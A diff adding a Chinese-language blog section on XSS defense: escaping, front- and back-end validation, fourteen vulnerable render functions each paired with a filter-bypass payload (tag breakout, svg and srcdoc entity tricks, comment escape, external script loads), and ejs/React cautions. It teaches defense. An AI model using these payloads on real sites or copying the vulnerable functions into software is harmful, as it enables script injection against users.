@@ -376,7 +376,7 @@
                   <span class="post-meta-item-text">字数统计</span>
                 
                 <span title="字数统计">
-                  2,813
+                  4,721
                 </span>
               
 
@@ -392,7 +392,7 @@
                   <span class="post-meta-item-text">阅读时长</span>
                 
                 <span title="阅读时长">
-                  11
+                  18
                 </span>
               
             </div>
@@ -638,7 +638,256 @@ btn.onclick = ()=&gt;{
 <h4 id="“反射型xss”"><a href="#“反射型xss”" class="headerlink" title="“反射型xss”"></a>“反射型xss”</h4><p>反射型，可以简单理解成，给服务器发什么，服务器就返回什么，就像小学生打王者，骂不过的一句“反弹”</p>
 <p>而，第二种富文本夹带攻击代码的方式，叫做：</p>
 <h4 id="“存储型xss”"><a href="#“存储型xss”" class="headerlink" title="“存储型xss”"></a>“存储型xss”</h4><p>存储型，主要是攻击代码已经被保存到服务器，所有用户都能够被攻击，危害比反射型要高，主要体现在博客论坛等。</p>
+<h1 id="四，xss防御"><a href="#四，xss防御" class="headerlink" title="四，xss防御"></a>四，xss防御</h1><h2 id="1-xss-filter"><a href="#1-xss-filter" class="headerlink" title="1,xss filter"></a>1,xss filter</h2><p>xss攻击主要是脚本注入，如果让脚本注入不进来，这样不就是行了嘛</p>
+<pre><code>content
+  .replace(/&amp;/g, &quot;&amp;amp;&quot;)
+  .replace(/&lt;/g, &quot;&amp;lt;&quot;)
+  .replace(/&gt;/g, &quot;&amp;gt;&quot;)
+  .replace(/&quot;/g, &quot;&amp;quot;&quot;)
+  .replace(/&apos;/g, &quot;&amp;#039;&quot;)
+</code></pre><p>例如，在输入的时候，将敏感的内容，替换成转义字符，但具体过滤什么需要视情况而定</p>
+<h2 id="2，双重校验"><a href="#2，双重校验" class="headerlink" title="2，双重校验"></a>2，双重校验</h2><p>首先，就是不信任原则，前端的校验不一定就全部都正确。</p>
+<p>其次，前端诞生之初的目的，是为了简单校验用户输入内容，避免不必要的网络请求，不是说前端校验了，后端就不需要校验。</p>
+<p>再次，后端做为入库的最后一个环节，必须做好最后一重校验。</p>
+<pre><code>从流程上，需要校验的环节：
 
+1，输入
+    前端校验
+    提交
+    后端校验
+
+2，输出
+    后端校验
+    返回
+    前端校验
+    前端展示
+</code></pre><h2 id="3，不要过分自信"><a href="#3，不要过分自信" class="headerlink" title="3，不要过分自信"></a>3，不要过分自信</h2><p>前面的两种方式，看似就能防御住xss攻击了，但事情并非那么简单，让我们循序渐进的感受一下xss攻击与防御</p>
+<hr>
+<h3 id="例一："><a href="#例一：" class="headerlink" title="例一："></a>例一：</h3><p>server code：</p>
+<pre><code>function render (input) {
+  return &apos;&lt;div&gt;&apos; + input + &apos;&lt;/div&gt;&apos;
+}
+</code></pre><p>input code：</p>
+<pre><code>&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre><p>这种情况没什么可说的，就是最简单的注入。</p>
+<hr>
+<h3 id="例二："><a href="#例二：" class="headerlink" title="例二："></a>例二：</h3><p>server code：</p>
+<pre><code>function render (input) {
+  return &apos;&lt;textarea&gt;&apos; + input + &apos;&lt;/textarea&gt;&apos;
+}
+</code></pre><p>input code：</p>
+<pre><code>&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre><p>利用没有过滤&lt;&gt;的问题，提前结束了textarea标签，并插入了新的script标签，最后输出：</p>
+<pre><code>&lt;textarea&gt;&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/textarea&gt;
+</code></pre><hr>
+<h3 id="例三："><a href="#例三：" class="headerlink" title="例三："></a>例三：</h3><p>server code：</p>
+<pre><code>function render (input) {
+  return &apos;&lt;input type=&quot;name&quot; value=&quot;&apos; + input + &apos;&quot;&gt;&apos;
+}
+</code></pre><p>input code：</p>
+<pre><code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;
+</code></pre><p>同样是提前结束了前一个标签，这种攻击方式叫做:</p>
+<p><strong>“猥琐绕过”</strong></p>
+<p>最后输出：</p>
+<pre><code>&lt;input type=&quot;name&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&quot;&gt;
+</code></pre><hr>
+<h3 id="暴露的问题"><a href="#暴露的问题" class="headerlink" title="暴露的问题"></a>暴露的问题</h3><p>可以看出猥琐绕过危害很大，既然如此我们只要替换&lt;&gt;不就可以了！</p>
+<p>但真实的业务场景中，replace(/&lt;/g,”&lt;”)，不能够满足所有的需求,<br>例如：</p>
+<ul>
+<li>转译序列，通过u003c和u003e替换&lt;&gt;,（这一部分，目前没测试出来，或许新版本浏览器已经解决该问题）</li>
+<li>src的onerror属性</li>
+<li>href的javascript:alert();</li>
+<li>base64的漏洞等</li>
+</ul>
+<p>所以我们接着对与xss漏洞的攻防做一个全面的了解</p>
+<hr>
+<h3 id="例四："><a href="#例四：" class="headerlink" title="例四："></a>例四：</h3><p>server code：</p>
+<pre><code>function render (input) {
+  const stripBracketsRe = /[()]/g
+  input = input.replace(stripBracketsRe, &apos;&apos;)
+  return input
+}
+</code></pre><p>input code：</p>
+<pre><code>&lt;script&gt;alert`1`&lt;/script&gt;
+</code></pre><p>Es6中，模版字符串可以紧跟在一个函数名后面，该函数将被调用来处理这个模板字符串。这被称为“标签模板”功能，最后输出：</p>
+<pre><code>&lt;script&gt;alert`1`&lt;/script&gt;
+</code></pre><p><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fkfi6of9o9j30rw0bkzl1.jpg" alt=""></p>
+<p>可以看到，alert被成功执行了。</p>
+<hr>
+<h3 id="例五："><a href="#例五：" class="headerlink" title="例五："></a>例五：</h3><p>server code：</p>
+<pre><code>function render (input) {
+  const stripBracketsRe = /[()`]/g
+  input = input.replace(stripBracketsRe, &apos;&apos;)
+  return input
+}
+</code></pre><p>此时，例四的攻击已经无效了</p>
+<p>input code one：</p>
+<pre><code>&lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt;
+</code></pre><p>Svg中可以直接执行实体字符的脚本</p>
+<p>除了使用svg标签以外，还可以使用iframe的属性，<br>input code two：</p>
+<pre><code>&lt;iframe srcdoc=&quot;&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt;&quot;&gt;
+</code></pre><p>这里是利用h5中iframe的srcdoc属性，srcdoc里的代码会作为iframe中的内容显示出来，srcdoc中可以直接去写转译后的html片段</p>
+<hr>
+<h3 id="例六："><a href="#例六：" class="headerlink" title="例六："></a>例六：</h3><p>server code：</p>
+<pre><code>function render (input) {
+  input = input.replace(/--&gt;/g, &apos;😂&apos;)
+  return &apos;&lt;!-- &apos; + input + &apos; --&gt;&apos;
+}
+</code></pre><p>这里过滤了–&gt;,<br>input code：</p>
+<pre><code>--!&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre><p>但其实html的注释还可以用&lt;!–这种–!&gt;</p>
+<pre><code>&lt;!—  以！开头，以！结尾对称注释的方式 —!&gt;
+</code></pre><p>这种攻击方式也叫做注释逃逸</p>
+<hr>
+<h3 id="例七："><a href="#例七：" class="headerlink" title="例七："></a>例七：</h3><p>server code：</p>
+<pre><code>function render (input) {
+  input = input.replace(/auto|on.*=|&gt;/ig, &apos;_&apos;)
+  return `&lt;input value=1 ${input} type=&quot;text&quot;&gt;`
+}
+</code></pre><p>这里过滤的事&gt;以及on开头的属性，这看似已经无法可想了</p>
+<p>input code：</p>
+<pre><code>type=&quot;image&quot; src onerror 
+= &quot;alert(1)&quot;
+</code></pre><p>首先：</p>
+<pre><code>考察的是input重复声明规则，input只认第一个声明,通过修改type=image,使input具备onerror方法。
+</code></pre><p>然后：</p>
+<pre><code>虽然onerror被正则掉了，但可以利用等号操作符两边可以插入任意符号和换行的原则，通过换行，躲过了正则
+</code></pre><hr>
+<h3 id="例八："><a href="#例八：" class="headerlink" title="例八："></a>例八：</h3><p>server code：</p>
+<pre><code>function render (input) {
+  const stripTagsRe = /&lt;\/?[^&gt;]+&gt;/gi
+
+  input = input.replace(stripTagsRe, &apos;&apos;)
+  return `&lt;article&gt;${input}&lt;/article&gt;`
+}
+</code></pre><p>上面的代码，是匹配所有&lt;开头，然后&gt;结尾的字符</p>
+<p>input code：</p>
+<pre><code>&lt;svg onload=&quot;alert(1)&quot;/
+</code></pre><p>这里是利用svg不用闭合的特性，使用onload属性来加载了js</p>
+<hr>
+<h3 id="例九："><a href="#例九：" class="headerlink" title="例九："></a>例九：</h3><p>server code：</p>
+<pre><code>function render (src) {
+  src = src.replace(/&lt;\/style&gt;/ig, &apos;/* \u574F\u4EBA */&apos;)
+  return `
+    &lt;style&gt;
+      ${src}
+    &lt;/style&gt;
+  `
+}
+</code></pre><p>上面的内容表示，输入的内容会变成样式，而且过滤了style的结束标记</p>
+<p>input code：</p>
+<pre><code>&lt;/style &gt;&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre><p>在style结束标记中加个空格即可，换行也可以，都可以逃逸正则</p>
+<hr>
+<h3 id="例十："><a href="#例十：" class="headerlink" title="例十："></a>例十：</h3><p>server code：</p>
+<pre><code>function render (input) {
+  let domainRe = /^https?:\/\/www\.segmentfault\.com/
+  if (domainRe.test(input)) {
+    return `&lt;script src=&quot;${input}&quot;&gt;&lt;/script&gt;`
+  }
+  return &apos;Invalid URL&apos;
+}
+</code></pre><p>上面的内容表示，输入的内容会变成样式，而且过滤了style的结束标记</p>
+<p>input code：</p>
+<pre><code>https://www.segmentfault.com/&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(1)//
+</code></pre><p>利用没有对“”进行过滤，提前添加“&gt;结束第一个标签，并闭合，再通过//注释掉后面的内容</p>
+<hr>
+<h3 id="例十一："><a href="#例十一：" class="headerlink" title="例十一："></a>例十一：</h3><p>server code：</p>
+<pre><code>function render (input) {
+  input = input.toUpperCase()
+  return `&lt;h1&gt;${input}&lt;/h1&gt;`
+}
+</code></pre><p>所有输入内容都被大写转译，<script>ALERT(1)</script>不会生效</p>
+<p>input code：</p>
+<pre><code>&lt;script src=&quot;https://www.xss.com/j.js&quot;&gt;&lt;/script&gt;
+</code></pre><p>src属性是不区分大小写的，所以可以通过引用外部文件来进行攻击</p>
+<hr>
+<h3 id="例十二："><a href="#例十二：" class="headerlink" title="例十二："></a>例十二：</h3><p>server code：</p>
+<pre><code>function render (input) {
+  input = input.replace(/script/ig, &apos;&apos;)
+  input = input.toUpperCase()
+  return &apos;&lt;h1&gt;&apos; + input + &apos;&lt;/h1&gt;&apos;
+}
+</code></pre><p>这一次不仅所有输入内容大写，而且还过滤了script</p>
+<p>input code：</p>
+<pre><code>&lt;scrscriptipt src=&quot;https://www.segmentfault.com.haozi.me/j.js&quot;&gt;&lt;/scrscriptipt&gt;
+</code></pre><p>就是利用过滤的原则，让它过滤掉script，然后剩下的内容又结合成了script</p>
+<hr>
+<h3 id="例十三："><a href="#例十三：" class="headerlink" title="例十三："></a>例十三：</h3><p>server code：</p>
+<pre><code>function render (input) {
+  input = input.replace(/[&lt;/&quot;&apos;]/g, &apos;&apos;)
+  return `
+    &lt;script&gt;
+          // alert(&apos;${input}&apos;)
+    &lt;/script&gt;
+  `
+}
+</code></pre><p>上面的代码，输入的内容，会被转译到注释里面，同时还过滤了&lt;,/,“,’这四个符号</p>
+<p>input code：</p>
+<pre><code>alert(1)
+--&gt;
+</code></pre><p>1,换行,用于逃逸注释,但还有’单引号在，alert还是不会执行</p>
+<p>2，利用html–&gt;注释符号来注释掉后面的单引号，以及多余的代码</p>
+<hr>
+<h3 id="例十四："><a href="#例十四：" class="headerlink" title="例十四："></a>例十四：</h3><p>server code：</p>
+<pre><code>function render (input) {
+  function escapeHtml(s) {
+    return s.replace(/&amp;/g, &apos;&amp;amp;&apos;)
+            .replace(/&apos;/g, &apos;&amp;#39;&apos;)
+            .replace(/&quot;/g, &apos;&amp;quot;&apos;)
+            .replace(/&lt;/g, &apos;&amp;lt;&apos;)
+            .replace(/&gt;/g, &apos;&amp;gt;&apos;)
+            .replace(/\//g, &apos;&amp;#x2f;&apos;)
+  }
+  return `&lt;img src onerror=&quot;console.error(&apos;${escapeHtml(input)}&apos;)&quot;&gt;`
+}
+</code></pre><p>上面的代码，看似没问题</p>
+<p>input code：</p>
+<pre><code>&apos;);alert(1);//
+</code></pre><p>1，首先结束前面的console</p>
+<p>2，再通过//注释掉后面的内容</p>
+<h2 id="4，xss防御总结"><a href="#4，xss防御总结" class="headerlink" title="4，xss防御总结"></a>4，xss防御总结</h2><p>通过前面的各种demo，可以将xss防御的方案分为几个方向：</p>
+<h3 id="1，明确业务线中，有xss风险的区域"><a href="#1，明确业务线中，有xss风险的区域" class="headerlink" title="1，明确业务线中，有xss风险的区域"></a>1，明确业务线中，有xss风险的区域</h3><ul>
+<li>（1）明确业务中，包含输入输出节点的环节</li>
+<li>（2）明确可能存在的xss风险，分辨有可能造成的是反射型xss还是存储型xss</li>
+<li>（3）尽量在开发前，避免潜在的xss风险</li>
+</ul>
+<p>例：</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fkflrgj951j30ua0rydjp.jpg" alt=""></p>
+<h3 id="2，防御xss攻击的规范"><a href="#2，防御xss攻击的规范" class="headerlink" title="2，防御xss攻击的规范"></a>2，防御xss攻击的规范</h3><ul>
+<li><p>（1）输入输出校验</p>
+<p>  需要在适当的业务场景下，选择适当的校验方案</p>
+</li>
+<li><p>（2）标签慎用</p>
+<p>  svg标签，iframe标签等的相关有风险属性，要敏感，避免使用</p>
+</li>
+<li><p>（3）属性敏感</p>
+<p>  href、onerror、onload、src等属性要高度敏感，在渲染部分要格外小心</p>
+</li>
+<li><p>（4）书写要严格规范</p>
+<p>  正则要考虑全面（例如换行），注释内不要有变量等。</p>
+</li>
+</ul>
+<h3 id="3，使用框架需要注意的地方"><a href="#3，使用框架需要注意的地方" class="headerlink" title="3，使用框架需要注意的地方"></a>3，使用框架需要注意的地方</h3><p>大部分业务场景其实都是通过框架来执行的</p>
+<h4 id="node的模版引擎ejs"><a href="#node的模版引擎ejs" class="headerlink" title="node的模版引擎ejs"></a>node的模版引擎ejs</h4><pre><code>&lt;%- value %&gt;
+&lt;%= value %&gt;
+
+- 代表没有转移，直接输出到html中
+= 代表转义之后，再输出到html中，所谓转义，就是把敏感的内容，转换成转义字符
+</code></pre><p>所以 - 操作符慎用或禁用，避免不必要的风险</p>
+<h4 id="react的dangerouslySetInnerHTML"><a href="#react的dangerouslySetInnerHTML" class="headerlink" title="react的dangerouslySetInnerHTML"></a>react的dangerouslySetInnerHTML</h4><p>react的render其实都会将要输出的内容转义之后，再输出到页面。</p>
+<p>但还是预留了dangerouslySetInnerHTML用于直接输出html，所以一定要慎用</p>
+<p>dangerouslySetInnerHTML的使用方法如下：</p>
+<pre><code>var HelloMessge = React.createClass({
+    render: (
+        &lt;div
+            dangerouslySetInnerHTML={{
+                    __html:  "alert(1);"
+                }}&gt;
+        &lt;/div&gt;
+    )
+})
+</code></pre>
           
         
       
@@ -1986,7 +2235,7 @@ npm:2.15.0
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共13.3k字</span>
+  <span class="post-count">博客全站共15.2k字</span>
 </div>
 <span>Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a></span>
 
